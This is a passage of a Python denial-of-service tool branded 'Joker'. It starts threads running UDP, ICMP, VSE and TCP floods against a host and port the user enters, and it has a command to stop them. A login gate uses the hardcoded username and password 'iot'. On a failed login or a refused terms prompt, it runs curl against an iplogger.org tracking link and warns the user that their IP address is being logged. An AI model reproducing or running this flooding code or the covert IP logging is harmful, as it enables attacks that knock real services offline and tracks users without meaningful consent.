                threading.Thread(target=killalludp, args=(host, port, timer, bytes)).start()
                threading.Thread(target=killallicmp, args=(host, port, timer, bytes)).start()
                threading.Thread(target=killallvse, args=(host, port, timer, payload)).start()
                threading.Thread(target=tcp, args=(host, port, timer, bytes)).start()
            except ValueError:
                print("                  [\033[36mJoker\033[00m]\033[91m the command {} requires an argument".format (Jokerput))
                main()
            except socket.gaierror:
                print("                  [\033[36mJoker\033[00m]\033[91m host: {} invalid".format (host))
                main()
        elif Jokerput == "stop":
            try:
                if atks == 0:
                    print("                  [\033[36mJoker\033[00m]\033[91m No Attacks Running")
                    main()
                else:
                    attack = False
                    print("                  [\033[36mJoker\033[00m] Stopped All Running Attacks")
                    while not attack:
                        if atks == 0:
                            attack = True
            except:
                exit()
        else:
            main()
try:
    terms = "yes"
    clear = "clear"
    os.system (clear)
    print(termssssss)
    termss = ["yes"]
    terms = getpass.getpass ("")
    if terms in termss:
        term = terms
    else:
        print ("                            ║\033[91mAgree with terms! logging ipaddress!")
        run("curl https://iplogger.org/2hpxU5")
        print ("\033[00m")
        exit()
except KeyboardInterrupt:
    print ("\n                            ║CTRL-C Pressed")
    print ("\033[00m")
    exit()
try:
    users = "iot"
    clear = "clear"
    os.system (clear)
    print(banner)
    userss = ["iot"]
    print("                            ╔════════════")
    username = getpass.getpass ("                            ║Username > ")
    if username in userss:
        user = username
    else:
        print ("                            ║\033[91mIncorrect username logging ipaddress!")
        run("curl https://iplogger.org/2hpxU5")
        print ("\033[00m")
        exit()
except KeyboardInterrupt:
    print ("\n                            ║CTRL-C Pressed")
    print ("\033[00m")
    exit()
try:
    passwords = ["iot"]
    clear = "clear"
    password = getpass.getpass ("                            ║Password > ")
    if password in passwords:
        passwd = password
    else:
        print ("                            ║\033[91mIncorrect password logging ipaddress!")
        run("curl https://iplogger.org/2hpxU5")
        print ("\033[00m")
        exit()
except KeyboardInterrupt:
    print ("\n                            ║CTRL-C Pressed")
    print ("\033[00m")
    exit()
except:
    exit()
else:
    main()